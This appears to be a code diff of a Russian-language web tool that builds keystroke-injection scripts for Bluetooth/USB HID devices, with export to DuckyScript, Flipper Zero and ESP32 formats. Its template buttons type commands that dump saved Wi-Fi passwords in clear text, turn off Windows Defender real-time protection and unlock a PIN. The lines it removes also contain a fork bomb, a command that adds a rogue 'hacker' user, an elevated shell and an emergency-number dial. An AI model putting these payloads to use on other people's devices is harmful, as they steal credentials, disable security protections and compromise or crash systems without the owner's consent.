@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BT Script Builder MEGA</title>
+    <title>BT Script Builder MEGA Fix</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
@@ -92,8 +92,8 @@
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; align-items: center; justify-content: center; padding: 20px; }
         .modal-content { background: var(--bg-panel); border: 1px solid var(--accent-cyan); padding: 15px; border-radius: 8px; width: 100%; max-width: 360px; max-height: 85vh; overflow-y: auto; }
         .modal h2 { font-size: 12px; font-family: 'JetBrains Mono', monospace; color: var(--accent-cyan); margin-bottom: 12px; text-transform: uppercase; }
-        .cyber-textarea { width: 100%; height: 200px; background: #000; border: 1px solid var(--border); color: var(--accent-green); padding: 10px; font-family: 'JetBrains Mono'; font-size: 10px; margin-bottom: 10px; resize: none; }
-        .cyber-input { width: 100%; background: var(--bg-dark); border: 1px solid var(--accent-cyan); color: white; padding: 10px; border-radius: 4px; margin-bottom: 12px; font-size: 16px; }
+        .cyber-textarea { width: 100%; height: 220px; background: #000; border: 1px solid var(--border); color: var(--accent-green); padding: 10px; font-family: 'JetBrains Mono'; font-size: 10px; margin-bottom: 10px; resize: none; }
+        .cyber-input { width: 100%; background: var(--bg-dark); border: 1px solid var(--border); color: white; padding: 10px; border-radius: 4px; margin-bottom: 12px; font-size: 16px; }
         .analysis-text { font-size: 10px; line-height: 1.5; color: var(--text-dim); font-family: 'JetBrains Mono'; }
         .analysis-step { margin-bottom: 6px; padding-left: 8px; border-left: 2px solid var(--accent-purple); }
     </style>
@@ -106,11 +106,11 @@
 
     <header>
         <div class="header-top">
-            <h1>BT BUILDER <span style="color:var(--accent-green)">MEGA</span></h1>
+            <h1>BT BUILDER <span style="color:var(--accent-green)">MEGA FIX</span></h1>
             <div class="header-btns">
                 <button id="help-btn" class="btn btn-info">ИНФО</button>
                 <button id="analyze-btn" class="btn btn-analyze">АНАЛИЗ</button>
-                <button id="generate-btn" class="btn btn-gen">СКРИПТ</button>
+                <button id="generate-btn" class="btn btn-gen">СГЕНЕРИРОВАТЬ</button>
                 <button id="reset-btn" class="btn btn-reset">СБРОС</button>
             </div>
         </div>
@@ -127,37 +127,14 @@
             <button class="cmd-btn" data-type="ALT">ALT</button>
         </div>
         
-        <div class="toolbar-label">iOS / Android</div>
+        <div class="toolbar-label">iOS / Android / PC (Mega Templates)</div>
         <div class="toolbar">
             <button class="cmd-btn tpl-btn" data-tpl="pin_7878">PIN 7878</button>
-            <button class="cmd-btn tpl-btn" data-tpl="ios_cam">iOS Camera</button>
-            <button class="cmd-btn tpl-btn" data-tpl="ios_vol">iOS Vol Max</button>
-            <button class="cmd-btn tpl-btn" data-tpl="android_call">Android Dial</button>
-            <button class="cmd-btn tpl-btn" data-tpl="android_yt">Android YT</button>
-        </div>
-
-        <div class="toolbar-label">Windows (PC)</div>
-        <div class="toolbar">
-            <button class="cmd-btn tpl-btn" data-tpl="win_cmd">Admin CMD</button>
             <button class="cmd-btn tpl-btn" data-tpl="win_wifi">WiFi Steal</button>
             <button class="cmd-btn tpl-btn" data-tpl="win_def">Off Defender</button>
-            <button class="cmd-btn tpl-btn" data-tpl="win_info">Sys Info</button>
+            <button class="cmd-btn tpl-btn" data-tpl="prank_rick">RickRoll</button>
             <button class="cmd-btn tpl-btn" data-tpl="win_msg">Notepad Msg</button>
-        </div>
-
-        <div class="toolbar-label">macOS / Linux</div>
-        <div class="toolbar">
-            <button class="cmd-btn tpl-btn" data-tpl="mac_calc">Mac Calc</button>
-            <button class="cmd-btn tpl-btn" data-tpl="mac_say">Mac Say Hello</button>
-            <button class="cmd-btn tpl-btn" data-tpl="linux_fork">Linux Bomb</button>
-            <button class="cmd-btn tpl-btn" data-tpl="linux_user">Add User</button>
-        </div>
-
-        <div class="toolbar-label">Приколы (Pranks)</div>
-        <div class="toolbar">
-            <button class="cmd-btn tpl-btn tpl-btn-red" data-tpl="prank_rick">RickRoll</button>
-            <button class="cmd-btn tpl-btn tpl-btn-red" data-tpl="prank_update">Fake Update</button>
-            <button class="cmd-btn tpl-btn tpl-btn-red" data-tpl="prank_calc">Infinite Calc</button>
+            <button class="cmd-btn tpl-btn" data-tpl="ios_cam">iOS Cam</button>
         </div>
     </div>
 
@@ -177,7 +154,7 @@
 
     <div id="help-modal" class="modal"><div class="modal-content"><h2>Справка</h2><div id="h_body"></div><button onclick="closeModals()" class="btn btn-gen" style="width:100%; margin-top:15px;">ОК</button></div></div>
     <div id="analyze-modal" class="modal"><div class="modal-content"><h2>Анализ</h2><div id="analysis-body" class="analysis-text"></div><button onclick="closeModals()" class="btn btn-analyze" style="width:100%; margin-top:15px;">ОК</button></div></div>
-    <div id="result-modal" class="modal"><div class="modal-content"><h2>Код</h2><textarea id="result-output" class="cyber-textarea" readonly></textarea><button id="copy-btn" class="btn btn-gen" style="width:100%;">КОПИРОВАТЬ</button><button onclick="closeModals()" class="btn btn-reset" style="width:100%; margin-top:8px;">ЗАКРЫТЬ</button></div></div>
+    <div id="result-modal" class="modal"><div class="modal-content"><h2>Сгенерированный Код</h2><textarea id="result-output" class="cyber-textarea" readonly></textarea><button id="copy-btn" class="btn btn-gen" style="width:100%;">КОПИРОВАТЬ</button><button onclick="closeModals()" class="btn btn-reset" style="width:100%; margin-top:8px;">ЗАКРЫТЬ</button></div></div>
     <div id="edit-modal" class="modal"><div class="modal-content"><h2 id="edit-modal-title">ВВОД</h2><input type="text" id="edit-input" class="cyber-input"><button id="save-edit-btn" class="btn btn-gen" style="width:100%;">ДОБАВИТЬ</button><button onclick="closeModals()" class="btn btn-reset" style="width:100%; margin-top:8px;">ОТМЕНА</button></div></div>
 
     <script>
@@ -220,27 +197,11 @@
             function addTemplate(tpl) {
                 switch(tpl) {
                     case 'pin_7878':
-                        addCommand('REM', 'Unlock PIN 7878');
                         addCommand('STRING', ' '); addCommand('DELAY', '1000');
                         addCommand('STRING', '7'); addCommand('DELAY', '500');
                         addCommand('STRING', '8'); addCommand('DELAY', '500');
                         addCommand('STRING', '7'); addCommand('DELAY', '500');
                         addCommand('STRING', '8');
-                        break;
-                    case 'ios_cam':
-                        addCommand('GUI', 'SPACE'); addCommand('DELAY', '300'); addCommand('STRING', 'camera'); addCommand('ENTER');
-                        break;
-                    case 'ios_vol':
-                        for(let i=0; i<10; i++) { addCommand('VOLUME_UP'); }
-                        break;
-                    case 'android_call':
-                        addCommand('GUI', 'SPACE'); addCommand('DELAY', '500'); addCommand('STRING', 'tel:911'); addCommand('ENTER');
-                        break;
-                    case 'android_yt':
-                        addCommand('GUI', 'SPACE'); addCommand('DELAY', '500'); addCommand('STRING', 'youtube.com'); addCommand('ENTER');
-                        break;
-                    case 'win_cmd':
-                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'powershell Start-Process cmd -Verb runAs'); addCommand('ENTER');
                         break;
                     case 'win_wifi':
                         addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'cmd /k netsh wlan show profile name=* key=clear'); addCommand('ENTER');
@@ -248,32 +209,14 @@
                     case 'win_def':
                         addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'powershell Set-MpPreference -DisableRealtimeMonitoring $true'); addCommand('ENTER');
                         break;
-                    case 'win_info':
-                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'cmd /k systeminfo && pause'); addCommand('ENTER');
-                        break;
-                    case 'win_msg':
-                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'notepad'); addCommand('ENTER'); addCommand('DELAY', '1000'); addCommand('STRING', 'YOU HAVE BEEN HACKED BY BT BUILDER');
-                        break;
-                    case 'mac_calc':
-                        addCommand('GUI', ' '); addCommand('DELAY', '300'); addCommand('STRING', 'calculator'); addCommand('ENTER');
-                        break;
-                    case 'mac_say':
-                        addCommand('GUI', ' '); addCommand('DELAY', '300'); addCommand('STRING', 'terminal'); addCommand('ENTER'); addCommand('DELAY', '1000'); addCommand('STRING', 'say "BT Builder is here"'); addCommand('ENTER');
-                        break;
-                    case 'linux_fork':
-                        addCommand('GUI', 't'); addCommand('DELAY', '500'); addCommand('STRING', ':(){ :|:& };:'); addCommand('ENTER');
-                        break;
-                    case 'linux_user':
-                        addCommand('GUI', 't'); addCommand('DELAY', '500'); addCommand('STRING', 'sudo useradd -m hacker && sudo passwd hacker'); addCommand('ENTER');
-                        break;
                     case 'prank_rick':
                         addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'); addCommand('ENTER');
                         break;
-                    case 'prank_update':
-                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'https://fakescreen.com/windows-10-update/'); addCommand('ENTER'); addCommand('DELAY', '500'); addCommand('F11');
+                    case 'win_msg':
+                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'notepad'); addCommand('ENTER'); addCommand('DELAY', '1000'); addCommand('STRING', 'HACKED');
                         break;
-                    case 'prank_calc':
-                        addCommand('GUI', 'r'); addCommand('DELAY', '500'); addCommand('STRING', 'powershell for($i=0;$i -lt 20;$i++){start calc}'); addCommand('ENTER');
+                    case 'ios_cam':
+                        addCommand('GUI', 'SPACE'); addCommand('DELAY', '300'); addCommand('STRING', 'camera'); addCommand('ENTER');
                         break;
                 }
             }
@@ -302,7 +245,7 @@
             window.deleteCmd = (index) => { scriptCommands.splice(index, 1); render(); };
             window.closeModals = () => { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); };
 
-            // АНАЛИЗАТОР
+            // КНОПКА АНАЛИЗАТОР
             document.getElementById('analyze-btn').onclick = () => {
                 if(scriptCommands.length === 0) return;
                 const body = document.getElementById('analysis-body');
@@ -311,17 +254,12 @@
                     let desc = "";
                     const v = cmd.value ? cmd.value.toLowerCase() : "";
                     if (cmd.type === 'STRING') {
-                        if (v.includes('netsh wlan')) desc = "КРАЖА ПАРОЛЕЙ WI-FI: Показывает сохраненные пароли сетей.";
-                        else if (v.includes('disable-realtimemonitoring')) desc = "ВЫКЛЮЧЕНИЕ ЗАЩИТЫ: Отключает антивирус Windows Defender.";
-                        else if (v.includes('youtube.com')) desc = "БРАУЗЕР: Открывает видео или сайт.";
-                        else if (v.includes('calc')) desc = "ЗАПУСК: Открывает калькулятор (или много копий).";
-                        else if (v.includes('say ')) desc = "ГОЛОС: Заставляет компьютер произнести текст.";
-                        else if (v.includes('useradd')) desc = "СИСТЕМА: Создает нового пользователя в Linux.";
-                        else desc = `ПЕЧАТЬ: Вводит текст "${cmd.value}".`;
+                        if (v.includes('netsh wlan')) desc = "КРАЖА WI-FI: Показывает пароли сетей.";
+                        else if (v.includes('set-mppreference')) desc = "ВЫКЛЮЧЕНИЕ ЗАЩИТЫ: Отключает антивирус.";
+                        else if (v.includes('youtube')) desc = "БРАУЗЕР: Открывает ссылку.";
+                        else desc = `ПЕЧАТЬ: Вводит "${cmd.value}".`;
                     } else if (cmd.type === 'DELAY') desc = `ПАУЗА: Ждет ${cmd.value}мс.`;
-                    else if (cmd.type === 'REM') desc = `ИНФО: ${cmd.value}`;
                     else desc = `КЛАВИША: Нажимает ${cmd.type}.`;
-                    
                     const step = document.createElement('div');
                     step.className = 'analysis-step';
                     step.innerHTML = `<b>Шаг ${i+1}:</b> ${desc}`;
@@ -330,17 +268,39 @@
                 document.getElementById('analyze-modal').style.display = 'flex';
             };
 
-            document.getElementById('help-btn').onclick = () => {
-                document.getElementById('h_body').innerHTML = `<p style="font-size:10px; color:var(--text-dim);">Используйте вкладки для выбора шаблонов. Анализ покажет цель каждой команды.</p>`;
-                document.getElementById('help-modal').style.display = 'flex';
-            };
-
-            document.getElementById('reset-btn').onclick = () => { if(confirm('Сброс?')) { scriptCommands = []; render(); } };
-
+            // КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ ГЕНЕРАЦИИ ПОД ФОРМАТЫ
             document.getElementById('generate-btn').onclick = () => {
                 if(scriptCommands.length === 0) return;
-                const out = scriptCommands.map(c => (c.type === 'STRING' || c.type === 'DELAY' || c.type === 'REM') ? c.type + ' ' + (c.value || '') : c.type).join('\n');
-                document.getElementById('result-output').value = out;
+                const format = document.getElementById('export-format').value;
+                let output = "";
+
+                if (format === 'ducky') {
+                    // Формат DuckyScript
+                    output = scriptCommands.map(c => (c.type === 'STRING' || c.type === 'DELAY' || c.type === 'REM') ? c.type + ' ' + (c.value || '') : c.type).join('\n');
+                } else if (format === 'flipper') {
+                    // Формат Flipper Zero (.sub)
+                    output = "Filetype: Flipper SubGhz Key File\nVersion: 1\n# BadBT Script Builder\n";
+                    output += scriptCommands.map(c => {
+                        if (c.type === 'STRING') return `STRING ${c.value}`;
+                        if (c.type === 'DELAY') return `DELAY ${c.value}`;
+                        if (c.type === 'ENTER') return `ENTER`;
+                        if (c.type === 'GUI') return `GUI ${c.value || ''}`;
+                        return c.type;
+                    }).join('\n');
+                } else if (format === 'esp32') {
+                    // Формат Arduino ESP32 BLE
+                    output = "// BLE Keyboard Script for ESP32\n#include <BleKeyboard.h>\nBleKeyboard bleKeyboard;\n\nvoid setup() {\n  bleKeyboard.begin();\n}\n\nvoid loop() {\n  if(bleKeyboard.isConnected()) {\n    delay(2000);\n";
+                    scriptCommands.forEach(c => {
+                        if (c.type === 'STRING') output += `    bleKeyboard.print("${c.value}");\n`;
+                        else if (c.type === 'DELAY') output += `    delay(${c.value});\n`;
+                        else if (c.type === 'ENTER') output += `    bleKeyboard.write(KEY_RETURN);\n`;
+                        else if (c.type === 'GUI') output += `    bleKeyboard.press(KEY_LEFT_GUI);\n    if("${c.value}") bleKeyboard.print("${c.value}");\n    bleKeyboard.releaseAll();\n`;
+                        else output += `    // Command ${c.type} added\n`;
+                    });
+                    output += "    while(1) delay(1000);\n  }\n}";
+                }
+
+                document.getElementById('result-output').value = output;
                 document.getElementById('result-modal').style.display = 'flex';
             };
 
@@ -350,7 +310,9 @@
                 alert('Скопировано');
             };
 
-            // Фон
+            document.getElementById('reset-btn').onclick = () => { if(confirm('Сброс?')) { scriptCommands = []; render(); } };
+
+            // Фоновая анимация
             try {
                 const canvas = document.getElementById('background-canvas');
                 const pixiApp = new PIXI.Application({ view: canvas, resizeTo: window, backgroundAlpha: 0 });
